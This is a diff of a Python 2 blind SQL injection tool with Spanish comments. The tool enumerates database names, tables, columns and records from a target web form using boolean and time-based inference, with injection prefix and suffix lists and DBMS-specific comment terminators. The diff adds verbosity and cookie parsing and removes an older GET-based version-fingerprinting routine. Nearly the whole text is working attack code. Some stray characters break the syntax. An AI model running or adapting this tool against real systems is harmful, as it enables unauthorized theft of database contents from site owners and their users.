@@ -1,7 +1,8 @@
 #!/usr/bin/env python
 #coding:utf-8
 import requests
-from sys import argv, exit
+from sys import argv, exit, stdout
+from urllib import unquote
 from HTMLParser import HTMLParser
 from getopt import getopt, GetoptError
 from time import sleep
@@ -58,6 +59,8 @@ class Injection:
 	#####################################################################
 	newPrefix = ""
 	newSuffix = ""
+	prefixSuccess = ""
+	suffixSuccess = ""
 	Which = ""
 	bases = []
 	Flags={ ## This variable store succesfull injection queries
@@ -69,7 +72,7 @@ class Injection:
 		}
 
 	Prefijos = [" ","''","'", #Simple Quotes
-				"')","'))","')))", #Simple Quotes with Parentheses
+				"')","'))","')))", #Simple Qulotes with Parentheses
 				'"','""',
 				'")','"))','")))',
 				"%'",'%"' #Comodines
@@ -81,13 +84,13 @@ class Injection:
 		#'MySQL':[' ','#','-- -a'," and '%'='"],
 		'Generic':['--','-- -'+chr(randint(65,122))],
 		'MySQL':['#','-- -'+chr(randint(65,122))],
-		'Postgres':["--",';/*',';--'],
+		'Postgres':["-- -"+chr(randint(65,122)),';-- -'+chr(randint(65,122))],
 		'Mssql':['-- -'+chr(randint(65,122))],
 		'Oracle':['from dual;']
 	}
 
 	GoodRequest=0
-l
+
 					#######################################
 					####   Queries loaded from files   ####
 					#######################################
@@ -101,33 +104,6 @@ l
 	numRegisters = 0
 	RecordQuerys = 0
 	TamrecordQuery = 0 
-
-	catalogoMySQL=["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
-	catalogo={
-		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
-		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
-		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
-	}
-	catalogoMySQL={
-		'version':["' and   ascii(substring(@@version,1,1))","'","and   ascii(substring(@@version,","))","-- -+"],
-		'tablas':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
-		'datos ':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
-	}
-	catalogoPostgres={
-		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
-		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
-		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
-	}
-	catalogoMSSQL={
-		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
-		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
-		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
-	}
-	catalogoOracle={
-		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
-		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
-		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
-	}
 
 	notautos=['and 1=0-- -+']
 	SentHeaders = ""
@@ -152,10 +128,14 @@ l
 	Based = "Both"
 	Time = 1.5
 	dormir = "DOORMIR"
+	verbosity = False
 
 
 	def __init__(self):
 		self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})
+
+	def setVerbosity(self,simon):
+		self.verbosity = simon
 
 	def searchDbname(self,Buscar):
 		self.dnames = Buscar
@@ -180,8 +160,9 @@ l
 		self.server = server
 
 	def setCookie(self,galleta):
-		#self.cookie.update({""})
-		print galleta
+		galleta = galleta.split(';')
+		for value in galleta:
+			self.cookies.update({value.split('=')[0]:value.split('=')[1]})
 
 	def setData(self,datosPagina):
 		datosPagina = datosPagina.split('&')
@@ -233,37 +214,11 @@ l
 	def setTime(self,ttime):
 		self.Time = ttime
 
-	@staticmethod
-	def busqueda(obj,manejador,tipo,ok,up,down,fila,columna):
-		caracter = chr(Injection.getMid(up,down))
-		print "up: ",up," car: ",ord(caracter)," down:",down
-		coord = str(fila)+","+str(columna)
-		print "Coordenada: "+coord
-		consulta = requests.get(url=obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+"="+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
-		if consulta.text == ok:
-			return caracter
-		elif (consulta.text != ok) and (up == down ):
-			return "No encontrado"
-		else:
-			print " Consulta 2:"+obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+"
+	def showCharacter(self,Character=""):
+		#pass
+		stdout.write("\033[1;36m"+Character+"\033[0m")
+		stdout.flush()
 
-			consulta2 = requests.get(url=obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
-			if consulta2.text == ok:
-				print "iguales"
-				print "up: ",up," down(car): ",ord(caracter)
-				print ""
-				return Injection.busqueda(obj,manejador,tipo,ok,up,ord(caracter),fila,columna)
-			else:
-				print "up(car): ",ord(caracter)," down:",down
-				print ""
-				down2=down
-				if (down2 + 1) == ord(caracter):
-					return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter)-1,down,fila,columna)
-				return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter),down,fila,columna)
-
-	@staticmethod
-	def getMid(up,down):
-		return int(((up-down)/2) + down)
 
 	def PostInjection(self):
 		#First try MySQL queries
@@ -290,7 +245,7 @@ l
 						# Imprimir Respuesta
 						if self.Based == "time":
 							#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
-							cumple = self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time) )
+							cumple = (Attempt.content == self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time) ))
 						else:
 							cumple = Attempt.content == self.GoodRequest.content
 						if cumple:
@@ -298,6 +253,10 @@ l
 							self.Flags[dbms]['Prefijo'].append(pref)
 							self.Flags[dbms]['Payload'].append(payl.replace(self.dormir,str(self.Time)))
 							self.Flags[dbms]['Sufijo'].append(suf)
+							#print "{0} {1} {2}".format(pref,payl.replace(self.dormir,str(self.Time)),suf)
+							#print Attempt.content
+							#print self.GoodRequest.content
+							#exit(1)
 						else:
 							if "syntax" in Attempt.content:
 								if not ans:
@@ -355,13 +314,16 @@ l
 				# Adding colors to Text
 				try:
 					ooo = "".join(("\033[1;36m"+"{0}={1}&").format(key, value) for key, value in self.datos.items())[:-1]
-					uuu = "\033[1;33m{0}\033[0m\033[5;32m{1}\033[0m\033[1;33m{2}\033[0m".format(choice(self.Flags[self.Which]['Prefijo']),choice(self.Flags[self.Which]['Payload']),choice(self.Flags[self.Which]['Sufijo']))
+					self.prefixSuccess = choice(self.Flags[self.Which]['Prefijo'])
+					self.suffixSuccess = choice(self.Flags[self.Which]['Sufijo'])
+					#uuu = "\033[1;33m{0}\033[0m\033[5;32m{1}\033[0m\033[1;33m{2}\033[0m".format(choice(self.Flags[self.Which]['Prefijo']),choice(self.Flags[self.Which]['Payload']),choice(self.Flags[self.Which]['Sufijo']))
+					uuu = "\033[1;33m{0}\033[0m\033[5;32m{1}\033[0m\033[1;33m{2}\033[0m".format(self.prefixSuccess,choice(self.Flags[self.Which]['Payload']),self.suffixSuccess)
 					ooo = ooo.replace(self.Comodin,uuu)
-					self.showData(ooo,vulnerable=True)
+					self.showData(ooo,vulnerable=True,objeto=self.GoodRequest)
 				except:
 					self.showData("No vulnerable try another dbms",vulnerable=False)
 
-	def showData(self,lll="",Previo=False,vulnerable=""):
+	def showData(self,lll="",Previo=False,vulnerable=False,objeto=""):
 		if Previo:
 			try:
 				previous = open(self.fullPath+"/"+self.succesfullQuery,"r").read()
@@ -375,28 +337,31 @@ l
 				print "not vulnerable"
 		else:
 			print "-"*140
-			print ":"*60,"Client Request",":"*60
+			print ":"*60,"Client Request",":"*60l
 			print "-"*140
-			print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(self.GoodRequest.request.method,self.GoodRequest.request.path_url)
-			for h in self.GoodRequest.request.headers: print "\033[1;35m"+h,":",self.GoodRequest.request.headers.get(h)+"\033[0m"
-			print "\n",lll,"\n\033[0m"
+			#print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(self.GoodRequest.request.method,self.GoodRequest.request.path_url)
+			# Cambiar objeto por self.GoodRequest
+			print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(objeto.request.method,objeto.request.path_url)
+			for h in objeto.request.headers: print "\033[1;35m"+h,":",objeto.request.headers.get(h)+"\033[0m"
+			print "\n\033[1;36m",lll,"\033[0m\n\033[0m"
 			print "-"*140
 			print ":"*60,"Server Response",":"*60
 			print "-"*140
-			for i in self.GoodRequest.headers: print "\033[1;35m"+i,":",self.GoodRequest.headers.get(i)+"\033[0m"
+			for i in objeto.headers: print "\033[1;35m"+i,":",objeto.headers.get(i)+"\033[0m"
 			####
 			## This section will write successfull data to file
-			if vulnerable:
-				try:
-					sss = open(self.fullPath+"/"+self.succesfullQuery,"w")
-																		#################################################
-																		# 	Format to use when write in a file as csv 	#
-																		#   url, method, dbms, prefix, sufix, request   #
-																		#################################################
-					sss.write("{0}:::{1}:::{2}:::{3}:::{4}:::{5}".format(self.GoodRequest.url.__str__(), self.GoodRequest.request.method, self.Which, choice(self.Flags[self.Which]['Prefijo']),choice(self.Flags[self.Which]['Sufijo']),lll))
-					sss.close()
-				except:
-					print "Failed to write data in file"
+			if vulnerable:# and Previo:
+				if not Previo:
+					try:
+						sss = open(self.fullPath+"/"+self.succesfullQuery,"w")
+																			#################################################
+																			# 	Format to use when write in a file as csv 	#
+																			#   url, method, dbms, prefix, sufix, request   #
+																			#################################################
+						sss.write("{0}:::{1}:::{2}:::{3}:::{4}:::{5}".format(self.GoodRequest.url.__str__(), self.GoodRequest.request.method, self.Which, self.prefixSuccess,self.suffixSuccess,lll))
+						sss.close()
+					except:
+						print "Failed to write data in file"
 			elif not vulnerable:
 				print "Bye"
 				exit(1)
@@ -560,7 +525,7 @@ l
 				elif kind == "registros":
 				 	query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ppd.replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,records=True,cAscii=medio,offset=ofset)
 				#sleep(0.5)
-				print query
+				#print query
 				#print ">>",self.newSuffix
 				AttemptLongi = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
 				if self.Based == "time":
@@ -597,7 +562,7 @@ l
 		print "="*3,"Guessing DB Names","="*3
 		print "="*25
 		tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="base")
-		print "Tamaño Base",tamanioRegistro
+		#print "Tamaño Base",tamanioRegistro
 		letter = ""
 		for posicion in xrange(1,tamanioRegistro+1):
 			#print "LOL Time"
@@ -609,6 +574,8 @@ l
 				self.dataTempo = self.datos.copy()
 				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.PayloadsDBnames.get(self.Which).replace(self.dormir,str(self.Time)),self.newSuffix),dname=True,pos=posicion,cAscii=medio)
 				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+				if self.verbosity:
+					self.showData(objeto=Attempt,vulnerable=True,lll=unquote(repr(Attempt.request.body)))
 				if self.Based == "time":
 					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time)) #(Attempt.elapsed.total_seconds())# + float(self.Time) )
 					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
@@ -616,7 +583,14 @@ l
 				else:
 					cumple = Attempt.content == self.GoodRequest.content
 				if found:
+					if chr(medio) != "," and not self.verbosity:
+						self.showCharacter(chr(medio))
+					else:
+						print ""
+					#print chr(medio),
+					#print "<<<<<<<<"
 					letter+=chr(medio)
+					#print letter
 					break
 				#if self.GoodRequest.content==Attempt.text:
 				if cumple:
@@ -631,7 +605,9 @@ l
 				if (limsup-liminf)-1==0:
 					found = True
 		self.BDatosName = letter.split(',')
-		print self.BDatosName
+		print ""
+		if self.verbosity:
+			for d in self.BDatosName: print "\033[1;36m"+d+"\033[0m"
 
 	def getPostTables(self):
 		print "\n"*3
@@ -650,20 +626,24 @@ l
 				for ldbn in self.BDatosName:
 					tt += self.AuxiliarTablasPost(ldbn)
 					self.RelacionBaseTabla[ldbn]=tt.split(',')
-					print "="*80
-					print ldbn,"=>",self.RelacionBaseTabla[ldbn]
+					#print "="*80
+					#print ldbn,"=>",self.RelacionBaseTabla[ldbn]
+					print ""
 			else:# Cuando el usuario escribe las bases de datos
 				for ldbn in self.listaBases:
 					tt += self.AuxiliarTablasPost(ldbn)
 					self.RelacionBaseTabla[ldbn]=tt.split(',')
-					print "="*80
-					print ldbn,"=>",self.RelacionBaseTabla[ldbn]
+					#print "="*80
+					#print ldbn,"=>",self.RelacionBaseTabla[ldbn]
+					print ""
+			if self.verbosity:
+				for d in self.BDatosName: print "\033[1;36m"+d+"\033[0m"
 
 	def AuxiliarTablasPost(self,ldbname=""):
 		#print ldbname
 		letter = ""
 		tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="tablas",nbase=ldbname)
-		print "...",ldbname
+		print "Checking",ldbname
 		for posicion in xrange(1,tamanioRegistro+1):
 			liminf = 31 #48 because is number 0
 			limsup = 127
@@ -675,6 +655,8 @@ l
 				#print query
 				#sleep(0.4)
 				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+				if self.verbosity:
+					self.showData(objeto=Attempt,Previo=False,lll=unquote(repr(Attempt.request.body)))
 				if self.Based == "time":
 					cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
 					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
@@ -682,6 +664,10 @@ l
 					cumple = Attempt.content == self.GoodRequest.content				
 
 				if found:
+					if chr(medio) != "," and not self.verbosity:
+						self.showCharacter(chr(medio))
+					else:
+						print ""
 					letter+=chr(medio)
 					break
 				#if self.GoodRequest.content==Attempt.text:
@@ -743,9 +729,10 @@ l
 				cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
 				#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
 			else:
-				cumple = Attempt.content == self.GoodRequest.content				
+				cumple = Attempt.content == self.GoodRequest.content
 
 			if found:
+
 				return chr(medio)
 			#if self.GoodRequest.content==Attempt.content:
 			if cumple:
@@ -781,9 +768,10 @@ l
 						self.listaColumnas = tt.split(',')
 						print "="*20
 						#print ldbn,"=>",TablaName,"=>>>>>>>",self.listaColumnas						
-						print "="*3,TablaName,"="*3
-						print "="*20
-						for alt in self.listaColumnas: print ">"*3,"\033[1;35m",alt,"\033[0m"
+						#print "="*3,TablaName,"="*3
+						#print "="*20
+						#for alt in self.listaColumnas: print ">"*3,"\033[1;35m",alt,"\033[0m"
+						print ""
 			else: # Cuando quiere obtener las columnas de las tablas que el defina
 				for ldbn in self.listaBases:
 					for TablaName in self.listaTablas:
@@ -791,11 +779,12 @@ l
 						tt = ""
 						tt += self.AuxiliarColumnasPost(ldbn,TablaName)
 						self.listaColumnas = tt.split(',')
-						print "="*20
+						#print "="*20
 						#print ldbn,"=>",TablaName,"=>>>>>>>",self.listaColumnas						
-						print "="*3,TablaName,"="*3
-						print "="*20
-						for alt in self.listaColumnas: print ">"*3,"\033[1;35m",alt,"\033[0m"
+						#print "="*3,TablaName,"="*3
+						#print "="*20
+						#for alt in self.listaColumnas: print ">"*3,"\033[1;35m",alt,"\033[0m"
+						print ""
 
 	def AuxiliarColumnasPost(self,ldbname="",tbname=""):
 		#print ldbname
@@ -819,6 +808,10 @@ l
 				else:
 					cumple = Attempt.content == self.GoodRequest.content				
 				if found:
+					if chr(medio) != "," and not self.verbosity:
+						self.showCharacter(chr(medio))
+					else:
+						print ""
 					letter+=chr(medio)
 					break
 				#if self.GoodRequest.content==Attempt.text:
@@ -889,7 +882,8 @@ l
 							longRecord = self.LongitudRegistro(tipo="registros",ofset=renglon,ppd=lengthMsg)
 							#### Aqui hacemos uso de otra funciona para que busque el caracter por medio de iteraciones de la posicion y el código Ascii
 							lleettrraass = self.getRecords(pppp=msg,offse=renglon,longitud=longRecord)
-							print ">"*2,"\033[1;36m",lleettrraass,"\033[0m"
+							#print "\033[1;36m",lleettrraass,"\033[0m"
+							#print ""
 
 	def getRecords(self,pppp="",offse="",longitud=""):
 		letras = ""
@@ -913,6 +907,11 @@ l
 				else:
 					cumple = Attempt.content == self.GoodRequest.content
 				if found:
+#					if chr(medio) != "," and not self.verbosity:
+#					if chr(medio) != ",":
+					self.showCharacter(chr(medio))
+#					else:
+#						print ""
 					letras+=chr(medio)
 					break
 				#if self.GoodRequest.content==Attempt.content:
@@ -961,49 +960,7 @@ l
 		#exit(1)
 		#sleep(1)
 		if self.method:#GET
-			pagina = requests.get(url=self.server,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
-			print "pagina "+pagina.text
-			for tauto in self.notautos:
-				print "Query ",tauto
-				tautosidad = requests.get(url=self.server+"' and 1=0 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
-				tautosidad2 = requests.get(url=self.server+"' and 1=1 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
-				print tautosidad.text
-				print tautosidad2.text
-				if (tautosidad.text != pagina.text and tautosidad2.text == pagina.text):
-					PGSQLoMySQL = requests.get(url=self.server+"' union select @@version -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
-#					print "!",PGSQLoMySQL.text," !! ",pagina.text
-					if PGSQLoMySQL.text == pagina.text:
-						MSSQLoMySQL = requests.get(url=self.server+"' and True -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
-						if MSSQLoMySQL.text == pagina.text:
-							database = "mysql"
-							print "Base de datos detectada: ",database
-							char = ""
-							version = ""
-							indiceY = 1
-							while char != "No encontrado":
-								char =self.busqueda(self,self.catalogoMySQL,"version",pagina.text,126,32,indiceY,1)
-								print "Caracter: "+char
-								if char != "No encontrado":
-									version += char
-									indiceY = indiceY +1
-							print "Version: "+version
-							
-						else:
-							database = "mssql"
-							print "Base de datos detectada: ",database
-					else:
-#						select tablename from pg_tables;
-						database = "postgres"
-						print "Base de datos detectada: ",database
-					for query in self.catalogo.get(database):		
-						ciego = requests.get(url=self.server+query,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
-				
-						if ciego == pagina:
-							print query + " ! " + ciego.text + " ! iguales"
-						else:
-							print query + " ! " + ciego.text + " ! no iguales"
-				else:
-					print "Página no vulnerable"
+			pass
 		#POST Method
 		else:
 			if not self.YaExiste: # If not exists files with records of previous scan
@@ -1030,11 +987,16 @@ l
 						print "Target not vulnerable"
 						exit(1)
 					self.getPostDBnames()
-				if self.tnames:
+				else:
+					self.getDelimiters()
+					if self.Which == 'Unknown':
+						print "Target not vulnerable"
+						exit(1)
+				if self.tnames and not self.cnames and not self.rnames:
 					self.getPostTables()
-				if self.cnames:
+				if self.tnames and self.cnames and not self.rnames:
 					self.getPostColumns()
-				if self.rnames:
+				if self.tnames and self.cnames and self.rnames:
 					self.getRowsRecords()
 					# Hay que serializar los datos
 					#print "Conociendo las columnas \n\n"
@@ -1076,7 +1038,7 @@ l
 
 def Opciones(argv):
 	try:
-		opciones, argumentos = getopt(argv[1:],"ho:v",["request=","cookie=","user-agent=","method=","random-agent","data=","proxy=","columns=","tables=","server=",'dbname=','db','based=',"time="])
+		opciones, argumentos = getopt(argv[1:],"ho:v",["v","request=","anduin=","cookies=","user-agent=","method=","random-agent","data=","proxy=","columns=","tables=","server=",'dbname=','db','based=',"time="])
 	except GetoptError:
 		print """### Ayuda ###\n{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>""".format(argv[0])
 		exit(2)
@@ -1086,13 +1048,17 @@ def Opciones(argv):
 			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
 		#Server
 		elif opt in ('--request'):
+			print vals
 			#print "{0} -> {1}".format(opt,vals)
 			inject.setServer(vals)
 		#User-Agent
+		elif opt in ('--anduin'):
+			print ">>",vals
 		elif opt in ('--user-agent'):
 			inject.setAgent(vals)
 			#print "{0} -> {1}".format(opt,vals)
-		elif opt in ('--cookie'):
+		elif opt in ('--cookies'):
+			print vals
 			inject.setCookie(vals)
 		elif opt in ('--data'):
 			inject.setData(vals)
@@ -1106,6 +1072,9 @@ def Opciones(argv):
 				ddd="all"
 			inject.searchTbname(True)
 			inject.setDBname(ddd)
+		elif opt == '-v':
+			print "Verbose"
+			inject.setVerbosity(True)
 		elif opt == '--db':
 			inject.searchDbname(True)
 		#Proxy params
